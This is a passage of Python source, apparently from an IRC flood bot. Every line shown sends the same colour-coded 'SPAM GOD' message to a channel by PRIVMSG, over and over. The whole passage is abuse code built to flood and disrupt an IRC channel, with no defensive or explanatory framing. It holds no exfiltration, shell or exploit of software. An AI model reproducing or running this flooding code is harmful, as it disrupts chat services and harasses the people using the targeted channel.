                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n')        
          

